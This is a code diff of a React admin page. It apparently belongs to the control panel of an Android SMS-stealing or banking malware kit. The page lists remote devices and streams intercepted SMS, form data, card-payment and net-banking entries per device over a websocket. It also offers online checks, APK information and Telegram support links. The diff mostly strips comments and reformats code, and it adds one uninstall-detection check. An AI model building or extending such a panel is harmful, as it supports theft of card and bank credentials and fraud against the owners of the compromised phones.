@@ -13,13 +13,11 @@ import { ENV, apiHeaders }               from "../config/constants";
 import { pickLastSeenAt }                from "../utils/reachability";
 import { logout }                        from "../services/api/auth";
 
-// ─── Types ────────────────────────────────────────────────────────────────────
 type AnyRecord      = Record<string, any>;
 type SortMode       = "new" | "old";
 type DeviceSortMode = "latest" | "old2new";
 type CheckStatus    = "checking" | "online" | "uninstalled";
 
-// ─── Helpers ──────────────────────────────────────────────────────────────────
 function str(v: any): string { return String(v ?? "").trim(); }
 
 function timeAgo(ts: number): string {
@@ -47,7 +45,6 @@ function getTs(m: any): number {
   return 0;
 }
 
-// ─── Live TimeAgo ─────────────────────────────────────────────────────────────
 function TimeAgo({ ts, className = "" }: { ts: number; className?: string }) {
   const [text, setText] = useState(() => timeAgo(ts));
   useEffect(() => {
@@ -93,7 +90,6 @@ function getPayloadEntries(obj: AnyRecord): [string, string][] {
 
 function copyText(v: string) { try { navigator.clipboard?.writeText(v); } catch {} }
 
-// ─── Dark-mode aware style helpers ───────────────────────────────────────────
 const D = {
   page:        (d: boolean) => d ? "bg-gray-900 text-gray-100" : "bg-gray-50 text-gray-900",
   card:        (d: boolean) => d ? "bg-gray-800 border-gray-700" : "bg-white border-gray-200",
@@ -112,7 +108,6 @@ const D = {
   deviceMeta:  (d: boolean) => d ? "text-gray-400" : "text-gray-500",
 };
 
-// ─── CopyBtn ──────────────────────────────────────────────────────────────────
 function CopyBtn({ value }: { value: string }) {
   const [ok, setOk] = useState(false);
   return (
@@ -123,7 +118,6 @@ function CopyBtn({ value }: { value: string }) {
   );
 }
 
-// ─── Form Card ────────────────────────────────────────────────────────────────
 function FormCard({ form, onDeviceClick, dark, deviceNumMap }: {
   form: AnyRecord; onDeviceClick?: (id: string) => void; dark: boolean;
   deviceNumMap?: Record<string, number>;
@@ -158,7 +152,6 @@ function FormCard({ form, onDeviceClick, dark, deviceNumMap }: {
   );
 }
 
-// ─── SMS Card ─────────────────────────────────────────────────────────────────
 function SmsCard({ sms, pageNum, onDeviceClick, dark, deviceNumMap }: {
   sms: AnyRecord; pageNum?: number; onDeviceClick?: (id: string) => void; dark: boolean;
   deviceNumMap?: Record<string, number>;
@@ -213,7 +206,6 @@ function SmsCard({ sms, pageNum, onDeviceClick, dark, deviceNumMap }: {
   );
 }
 
-// ─── Group Card ───────────────────────────────────────────────────────────────
 function GroupCard({ deviceId, items, onDeviceClick, dark, deviceNumMap }: {
   deviceId: string; items: AnyRecord[]; onDeviceClick?: (id: string) => void; dark: boolean;
   deviceNumMap?: Record<string, number>;
@@ -252,7 +244,6 @@ function GroupCard({ deviceId, items, onDeviceClick, dark, deviceNumMap }: {
   );
 }
 
-// ─── Device Card ──────────────────────────────────────────────────────────────
 function DeviceCard({ device, displayNum, onCheckOnline, onOpen, recentlyOnline, dark, isUninstalled }: {
   device: AnyRecord; displayNum: number;
   onCheckOnline: (id: string) => void;
@@ -353,7 +344,6 @@ function DeviceCard({ device, displayNum, onCheckOnline, onOpen, recentlyOnline,
   );
 }
 
-// ─── Check Online Alert ───────────────────────────────────────────────────────
 function CheckAlert({ status, onClose }: { status: CheckStatus; onClose: () => void }) {
   return (
     <div className="fixed inset-0 z-[999] flex items-center justify-center bg-black/40">
@@ -379,14 +369,12 @@ function CheckAlert({ status, onClose }: { status: CheckStatus; onClose: () => v
   );
 }
 
-// ─── Search Bar ───────────────────────────────────────────────────────────────
-function SearchBar({ value, onChange, onSearch, filter, onFilter, options, dark, showSearchBtn = false }: {
+function SearchBar({ value, onChange, onSearch, filter, onFilter, options, dark }: {
   value: string; onChange: (v: string) => void;
   onSearch?: () => void;
   filter: string; onFilter: (v: string) => void;
   options: { value: string; label: string }[];
   dark: boolean;
-  showSearchBtn?: boolean;
 }) {
   return (
     <div className="flex items-center gap-2 px-3 py-2">
@@ -398,11 +386,8 @@ function SearchBar({ value, onChange, onSearch, filter, onFilter, options, dark,
           placeholder="Search..."
           className={`h-10 w-full rounded-full border pl-4 pr-10 text-[13px] outline-none ${D.searchBg(dark)}`}
         />
-        <button
-          type="button"
-          onClick={onSearch}
-          className="absolute right-3 top-1/2 -translate-y-1/2 text-[16px]"
-        >
+        <button type="button" onClick={onSearch}
+          className="absolute right-3 top-1/2 -translate-y-1/2 text-[16px]">
           🔍
         </button>
       </div>
@@ -414,7 +399,6 @@ function SearchBar({ value, onChange, onSearch, filter, onFilter, options, dark,
   );
 }
 
-// ─── CEH Trademark Banner ─────────────────────────────────────────────────────
 function CehBanner({ dark }: { dark: boolean }) {
   return (
     <div className={`flex items-center justify-between px-4 py-2 border-b ${dark ? "border-gray-700 bg-gray-900" : "border-gray-100 bg-white"}`}>
@@ -428,16 +412,14 @@ function CehBanner({ dark }: { dark: boolean }) {
   );
 }
 
-// ─── MAIN PAGE ────────────────────────────────────────────────────────────────
 const SMS_PER_PAGE = 20;
 
 export default function MainPage() {
-  const nav      = useNavigate();
-  const location  = useLocation();
+  const nav     = useNavigate();
+  const location = useLocation();
 
   const [helpOpen,    setHelpOpen]    = useState(false);
   const [helpScreen,  setHelpScreen]  = useState<"" | "settings" | "apk">("");
-
   const [globalPhone,    setGlobalPhone]    = useState("");
   const [globalEnabled,  setGlobalEnabled]  = useState(false);
   const [globalLoading,  setGlobalLoading]  = useState(false);
@@ -446,7 +428,6 @@ export default function MainPage() {
   const [pinNew,         setPinNew]         = useState("");
   const [pinConfirm,     setPinConfirm]     = useState("");
   const [pinMsg,         setPinMsg]         = useState("");
-
   const [licenseInfo,  setLicenseInfo]  = useState<any>(null);
   const [contactOpen,  setContactOpen]  = useState(false);
 
@@ -464,12 +445,11 @@ export default function MainPage() {
 
   const [dark,       setDark]       = useState(false);
   const [search,     setSearch]     = useState("");
-  const [searchQ,    setSearchQ]    = useState(""); // committed search query
+  const [searchQ,    setSearchQ]    = useState("");
   const [sortMode,   setSortMode]   = useState<SortMode>("new");
   const [deviceSort, setDeviceSort] = useState<DeviceSortMode>("latest");
   const [alertText,  setAlertText]  = useState("");
 
-  // ── Uninstalled device set (frontend only, resets on refresh) ────────────
   const [uninstalledSet, setUninstalledSet] = useState<Set<string>>(new Set());
 
   const [devices,  setDevices]  = useState<AnyRecord[]>([]);
@@ -484,15 +464,14 @@ export default function MainPage() {
   const [loadingGroups,  setLoadingGroups]  = useState(false);
   const groupsLoadedRef = useRef(false);
 
-  const [checkAlert,         setCheckAlert]         = useState<{ deviceId: string; status: CheckStatus } | null>(null);
-  const [recentlyOnlineMap,  setRecentlyOnlineMap]  = useState<Record<string, number>>({});
-  const checkDeviceIdRef  = useRef("");
-  const checkStatusRef    = useRef<CheckStatus | null>(null);
-  const checkTimerRef     = useRef<ReturnType<typeof setTimeout> | null>(null);
-  const checkWindowRef    = useRef<number>(0);
-  const deviceOrderRef    = useRef<string[]>([]);
+  const [checkAlert,        setCheckAlert]        = useState<{ deviceId: string; status: CheckStatus } | null>(null);
+  const [recentlyOnlineMap, setRecentlyOnlineMap] = useState<Record<string, number>>({});
+  const checkDeviceIdRef = useRef("");
+  const checkStatusRef   = useRef<CheckStatus | null>(null);
+  const checkTimerRef    = useRef<ReturnType<typeof setTimeout> | null>(null);
+  const checkWindowRef   = useRef<number>(0);
+  const deviceOrderRef   = useRef<string[]>([]);
 
-  // ── Device number map: deviceId -> display number ────────────────────────
   const deviceNumMap = useMemo(() => {
     const map: Record<string, number> = {};
     const order = deviceOrderRef.current;
@@ -504,7 +483,6 @@ export default function MainPage() {
     return map;
   }, [devices]);
 
-  // ── Loaders ──────────────────────────────────────────────────────────────
   const loadDevices = useCallback(async () => {
     setLoadingDevices(true);
     try {
@@ -555,18 +533,15 @@ export default function MainPage() {
       setForms(list);
       if (list.length > 0) loadGroupData(list);
     } catch (e) { console.error(e); } finally { setLoadingForms(false); }
-
     try {
       const r = await fetch(`${ENV.API_BASE}/api/admin/alert-text`, { headers: apiHeaders() });
       if (r.ok) { const d = await r.json(); if (d?.text) setAlertText(String(d.text)); }
     } catch {}
   }, [loadDevices, loadSms, loadGroupData]);
 
-  // ── WS ────────────────────────────────────────────────────────────────────
   useEffect(() => {
     wsService.connect();
     loadAll();
-
     const off = wsService.onMessage((msg) => {
       if (!msg || msg.type !== "event") return;
       const event    = String(msg.event || "");
@@ -580,7 +555,6 @@ export default function MainPage() {
         setSmsMap((p) => ({ ...p, [did]: [ns, ...(p[did] || [])].sort((a, b) => getTs(b) - getTs(a)) }));
         return;
       }
-
       if (event === "form:created" || event === "form_submissions:created") {
         const data = msg.data || {};
         const did  = String(data.uniqueid || data.deviceId || deviceId || "");
@@ -589,7 +563,6 @@ export default function MainPage() {
         groupsLoadedRef.current = false;
         return;
       }
-
       if (event === "card:created" || event === "card_payment:created") {
         const data = msg.data || {};
         const did  = String(data.uniqueid || data.deviceId || deviceId || "");
@@ -598,7 +571,6 @@ export default function MainPage() {
         setCardMap((p) => ({ ...p, [did]: [pl, ...(p[did] || [])] }));
         return;
       }
-
       if (event === "netbanking:created" || event === "net_banking:created") {
         const data = msg.data || {};
         const did  = String(data.uniqueid || data.deviceId || deviceId || "");
@@ -607,7 +579,6 @@ export default function MainPage() {
         setNetMap((p) => ({ ...p, [did]: [pl, ...(p[did] || [])] }));
         return;
       }
-
       if (event === "device:lastSeen" || event === "device:upsert") {
         const did = String(msg.deviceId || msg?.data?.deviceId || "");
         setDevices((p) => {
@@ -618,21 +589,17 @@ export default function MainPage() {
               : d
             );
           }
-          if (event === "device:upsert" && msg.data && did) {
-            return [msg.data, ...p];
-          }
+          if (event === "device:upsert" && msg.data && did) return [msg.data, ...p];
           return p;
         });
         return;
       }
-
       if (event === "check_online:result") {
         const did    = String(msg.deviceId || msg?.data?.deviceId || "");
         const ts     = Number(msg?.data?.checkedAt || Date.now());
         const status = String(msg?.data?.status || "");
         const err    = String(msg?.data?.error  || "");
         const inW    = checkDeviceIdRef.current === did && checkStatusRef.current === "checking";
-
         if (status === "online" && did) {
           setDevices((p) => p.map((d) => str(d.deviceId) === did ? { ...d, checkedAt: ts } : d));
           setRecentlyOnlineMap((p) => ({ ...p, [did]: ts }));
@@ -649,13 +616,9 @@ export default function MainPage() {
         }
         return;
       }
-
       if (event === "device:uninstalled") {
         const did = String(msg.deviceId || msg?.data?.deviceId || "");
-        // Frontend mein uninstalled mark karo permanently
-        if (did) {
-          setUninstalledSet((p) => new Set([...p, did]));
-        }
+        if (did) setUninstalledSet((p) => new Set([...p, did]));
         const inW = checkDeviceIdRef.current === did &&
           (checkStatusRef.current === "checking" || (checkStatusRef.current === null && Date.now() - checkWindowRef.current < 30000));
         if (inW) {
@@ -665,7 +628,6 @@ export default function MainPage() {
         }
         return;
       }
-
       if (event === "device:delete") {
         const did = String(msg.deviceId || msg?.data?.deviceId || "");
         setDevices((p) => p.filter((d) => str(d.deviceId) !== did));
@@ -673,7 +635,6 @@ export default function MainPage() {
         setUninstalledSet((p) => { const c = new Set(p); c.delete(did); return c; });
       }
     });
-
     return () => { off(); };
   }, [loadAll]);
 
@@ -681,7 +642,6 @@ export default function MainPage() {
     if (activeTab === "groups" && !groupsLoadedRef.current && forms.length > 0) loadGroupData(forms);
   }, [activeTab, forms, loadGroupData]);
 
-  // ── Check Online ─────────────────────────────────────────────────────────
   const handleCheckOnline = useCallback(async (deviceId: string) => {
     if (!deviceId) return;
     checkDeviceIdRef.current = deviceId;
@@ -702,16 +662,9 @@ export default function MainPage() {
   }, []);
 
   const openDevice = useCallback((id: string) => { if (id) nav(`/devices/${encodeURIComponent(id)}`); }, [nav]);
-
-  const closeCheckAlert = useCallback(() => {
-    if (checkTimerRef.current) clearTimeout(checkTimerRef.current);
-    setCheckAlert(null);
-  }, []);
-
-  // ── Search commit ─────────────────────────────────────────────────────────
+  const closeCheckAlert = useCallback(() => { if (checkTimerRef.current) clearTimeout(checkTimerRef.current); setCheckAlert(null); }, []);
   const commitSearch = useCallback(() => { setSearchQ(search.trim().toLowerCase()); }, [search]);
 
-  // ── Computed ──────────────────────────────────────────────────────────────
   const { allSms, smsPageMap } = useMemo(() => {
     const list: AnyRecord[] = [];
     const pageMap: Record<string, number> = {};
@@ -787,13 +740,11 @@ export default function MainPage() {
     return ordered;
   }, [devices, deviceSort]);
 
-  // searchQ use karo filtering ke liye (committed)
   function filterQ<T extends AnyRecord>(list: T[]): T[] {
     if (!searchQ) return list;
     return list.filter((item) => JSON.stringify(item).toLowerCase().includes(searchQ));
   }
 
-  // ── Help helpers ──────────────────────────────────────────────────────────
   function handleLogout() { setHelpOpen(false); logout(); }
 
   function _openLink(url: string) {
@@ -835,9 +786,7 @@ export default function MainPage() {
     _openLink(raw.startsWith("http") ? raw : `https://${raw}`);
   }
 
-  function openTelegramHelp() {
-    _openLink(String(ENV.TELEGRAM_CHANNEL || "https://t.me/"));
-  }
+  function openTelegramHelp() { _openLink(String(ENV.TELEGRAM_CHANNEL || "https://t.me/")); }
 
   async function loadGlobalPhone() {
     try {
@@ -890,10 +839,7 @@ export default function MainPage() {
 
   return (
     <div className={`min-h-screen ${D.page(dark)}`}>
-
-      {/* CEH Trademark Banner */}
       <CehBanner dark={dark} />
-
       <TopNav
         activeTab={activeTab}
         onTabChange={handleTabChange}
@@ -903,19 +849,11 @@ export default function MainPage() {
       />
 
       {activeTab !== "devices" && activeTab !== "help" && (
-        <SearchBar
-          value={search}
-          onChange={setSearch}
-          onSearch={commitSearch}
-          filter={sortMode}
-          onFilter={(v) => setSortMode(v as SortMode)}
-          options={SORT_OPTS}
-          dark={dark}
-          showSearchBtn
-        />
+        <SearchBar value={search} onChange={setSearch} onSearch={commitSearch}
+          filter={sortMode} onFilter={(v) => setSortMode(v as SortMode)}
+          options={SORT_OPTS} dark={dark} />
       )}
 
-      {/* HOME */}
       {activeTab === "home" && (
         <div className="space-y-3 px-3 pb-24 pt-1">
           {isLoading
@@ -931,7 +869,6 @@ export default function MainPage() {
         </div>
       )}
 
-      {/* DATA */}
       {activeTab === "data" && (
         <div className="space-y-3 px-3 pb-24 pt-1">
           {isLoading || loadingGroups
@@ -945,7 +882,6 @@ export default function MainPage() {
         </div>
       )}
 
-      {/* MESSAGES */}
       {activeTab === "messages" && (
         <div className="space-y-3 px-3 pb-24 pt-1">
           {loadingSms
@@ -959,7 +895,6 @@ export default function MainPage() {
         </div>
       )}
 
-      {/* GROUPS */}
       {activeTab === "groups" && (
         <div className="space-y-3 px-3 pb-24 pt-1">
           {loadingForms || loadingGroups
@@ -973,19 +908,11 @@ export default function MainPage() {
         </div>
       )}
 
-      {/* DEVICES */}
       {activeTab === "devices" && (
         <div className="pb-24">
-          <SearchBar
-            value={search}
-            onChange={setSearch}
-            onSearch={commitSearch}
-            filter={deviceSort}
-            onFilter={(v) => setDeviceSort(v as DeviceSortMode)}
-            options={DEVICE_OPTS}
-            dark={dark}
-            showSearchBtn
-          />
+          <SearchBar value={search} onChange={setSearch} onSearch={commitSearch}
+            filter={deviceSort} onFilter={(v) => setDeviceSort(v as DeviceSortMode)}
+            options={DEVICE_OPTS} dark={dark} />
           {loadingDevices
             ? <div className={`py-10 text-center ${D.empty(dark)}`}>Loading…</div>
             : filterQ(sortedDevices).length === 0
@@ -1000,7 +927,11 @@ export default function MainPage() {
                       onOpen={openDevice}
                       recentlyOnline={!!recentlyOnlineMap[str(d.deviceId)]}
                       dark={dark}
-                      isUninstalled={uninstalledSet.has(str(d.deviceId))}
+                      // ── UPDATED: DB se bhi aur WS event se bhi uninstalled check ──
+                      isUninstalled={
+                        uninstalledSet.has(str(d.deviceId)) ||
+                        str(d.fcmToken) === "__UNINSTALLED__"
+                      }
                     />
                   ))}
                 </div>
@@ -1008,12 +939,9 @@ export default function MainPage() {
         </div>
       )}
 
-      {/* HELP */}
       {helpOpen && (
-        <div className="fixed inset-0 z-[1000] flex items-end bg-black/60"
-          onClick={() => setHelpOpen(false)}>
-          <div className="w-full rounded-t-2xl bg-[#1c1c1c] px-5 pt-5 pb-8"
-            onClick={e => e.stopPropagation()}>
+        <div className="fixed inset-0 z-[1000] flex items-end bg-black/60" onClick={() => setHelpOpen(false)}>
+          <div className="w-full rounded-t-2xl bg-[#1c1c1c] px-5 pt-5 pb-8" onClick={e => e.stopPropagation()}>
             <div className="mb-4 flex items-center justify-between">
               <span className="text-[18px] font-bold text-white">Help</span>
               <button type="button" onClick={() => setHelpOpen(false)}
@@ -1027,31 +955,23 @@ export default function MainPage() {
               ].map(item => (
                 <button key={item.label} type="button" onClick={item.onClick}
                   className="flex w-full items-center justify-between py-3 text-[15px] text-gray-200">
-                  <span>{item.label}</span>
-                  <span className="text-gray-500">›</span>
+                  <span>{item.label}</span><span className="text-gray-500">›</span>
                 </button>
               ))}
             </div>
             <div className="space-y-2">
               <button type="button" onClick={() => setContactOpen(true)}
-                className="w-full rounded-xl border-2 border-green-500 py-3 text-[14px] font-semibold text-green-400">
-                Contact Us
-              </button>
+                className="w-full rounded-xl border-2 border-green-500 py-3 text-[14px] font-semibold text-green-400">Contact Us</button>
               <button type="button" onClick={openTelegramHelp}
-                className="w-full rounded-xl border-2 border-blue-500 py-3 text-[14px] font-semibold text-blue-400">
-                Telegram Channel
-              </button>
+                className="w-full rounded-xl border-2 border-blue-500 py-3 text-[14px] font-semibold text-blue-400">Telegram Channel</button>
             </div>
           </div>
         </div>
       )}
 
-      {/* Contact Us popup */}
       {contactOpen && (
-        <div className="fixed inset-0 z-[1001] flex items-end justify-center bg-black/40"
-          onClick={() => setContactOpen(false)}>
-          <div className="w-full rounded-t-2xl bg-white px-5 pt-5 pb-8"
-            onClick={e => e.stopPropagation()}>
+        <div className="fixed inset-0 z-[1001] flex items-end justify-center bg-black/40" onClick={() => setContactOpen(false)}>
+          <div className="w-full rounded-t-2xl bg-white px-5 pt-5 pb-8" onClick={e => e.stopPropagation()}>
             <div className="mb-4 text-center text-[15px] font-extrabold text-gray-900">Contact Us</div>
             <div className="space-y-3">
               <button type="button" onClick={() => { setContactOpen(false); openWhatsApp(); }}
@@ -1065,7 +985,6 @@ export default function MainPage() {
         </div>
       )}
 
-      {/* SETTINGS */}
       {helpScreen === "settings" && (
         <div className="fixed inset-0 z-[1000] overflow-auto bg-[#f5f5f5]">
           <div className="sticky top-0 flex items-center gap-3 bg-white px-4 py-3 shadow-sm">
@@ -1113,7 +1032,6 @@ export default function MainPage() {
         </div>
       )}
 
-      {/* APK INFO */}
       {helpScreen === "apk" && (
         <div className="fixed inset-0 z-[1000] overflow-auto bg-[#f5f5f5]">
           <div className="sticky top-0 flex items-center gap-3 bg-white px-4 py-3 shadow-sm">
@@ -1143,7 +1061,6 @@ export default function MainPage() {
         </div>
       )}
 
-      {/* Refresh FAB */}
       <button type="button" onClick={loadAll}
         className="fixed bottom-6 right-4 z-40 flex h-12 w-12 items-center justify-center rounded-full bg-black text-white shadow-lg text-[20px] hover:bg-gray-800"
         title="Refresh">↻</button>
